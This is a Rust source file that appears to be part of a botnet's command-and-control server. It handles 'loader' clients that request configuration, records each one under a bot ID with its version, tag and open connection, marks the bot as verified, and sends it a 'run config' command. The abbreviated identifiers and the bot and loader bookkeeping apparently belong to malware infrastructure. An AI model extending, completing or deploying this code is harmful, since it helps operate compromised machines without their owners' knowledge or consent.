use std::sync::Arc;
use chrono::Utc;
use loader_vars::types::{
    receive::{ ClAct, ClPrms, RnCnfgPrms },
    send::{ LdrSnd, SrvAct, SrvPrms },
};
use tokio::{ net::TcpStream, sync::{ Mutex, RwLock } };
use anyhow::Result;
use crate::server::{
    http_server::{ Bot, LoaderInstance, ServerHandler },
    sanitization::verify_loader_get_config,
};

pub async fn route_loader(
    handler: &ServerHandler,
    payload: LdrSnd,
    stream_ref: Arc<Mutex<TcpStream>>
) -> Result<()> {
    match payload.action {
        SrvAct::GtCnfg => { init(handler, payload, stream_ref).await }
    }
}

pub async fn init(
    handler: &ServerHandler,
    payload: LdrSnd,
    stream_ref: Arc<Mutex<TcpStream>>
) -> Result<()> {
    if let SrvPrms::GtCnfg(params) = payload.params {
        verify_loader_get_config(&params)?;

        let mut bot_map = handler.bot_map.write().await;
        let new_loader_instance = LoaderInstance {
            join_date: Utc::now().to_rfc3339(),
            version: payload.version,
            tag: params.tag,
            stream: stream_ref.clone(),
        };
        if let Some(bot) = bot_map.get_mut(&payload.id) {
            let mut loader_instances = bot.loader_instances.write().await;
            loader_instances.push(new_loader_instance);
            bot.verified = true;
        } else {
            bot_map.insert(
                payload.id.clone(),
                Bot::new(
                    payload.id.clone(),
                    Arc::new(RwLock::new(vec![])),
                    Arc::new(RwLock::new(vec![new_loader_instance])),
                    true,
                    Some(params.mib_config)
                )
            );
        }
        drop(bot_map);
        ServerHandler::send_action_to_loader(
            stream_ref,
            ClAct::RnCnfg,
            ClPrms::RnCnfg(RnCnfgPrms::default())
        ).await
    } else {
        return Err(anyhow::anyhow!(format!("Invalid params for: {:#?}", payload.action)));
    }
}
